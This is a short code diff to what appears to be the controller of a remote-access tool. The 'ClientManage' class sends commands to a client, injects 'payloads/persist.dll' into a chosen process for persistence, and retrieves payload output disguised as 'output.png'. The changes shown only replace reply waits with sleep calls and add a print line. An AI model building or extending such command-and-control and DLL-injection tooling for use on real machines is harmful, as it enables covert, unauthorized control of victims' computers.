@@ -239,10 +239,10 @@ class ClientManage:
         def PrintPayloadOutput():
             self.SendData("fupload:output.png")
             self.WaitForReply()
-
+            time.sleep(2)
             if(os.path.isfile("downloads/output.png")):
+                print("[+] Output : ")
                 PrintTextFile("downloads/output.png")
-
             else:
                 print("[x] Failed to get payload output.")
         # if(session):
@@ -717,7 +717,7 @@ Open Ports
                     if(len(app) > 0):
                         SendPayloadCommand(app)
                         DLLTransfer("payloads/persist.dll", setting('inject_process'))
-                        self.WaitForReply()
+                        time.sleep(2)
                         PrintPayloadOutput()
                         RemovePayloadCommand()
                         if(os.path.isfile("downloads/output.png")):
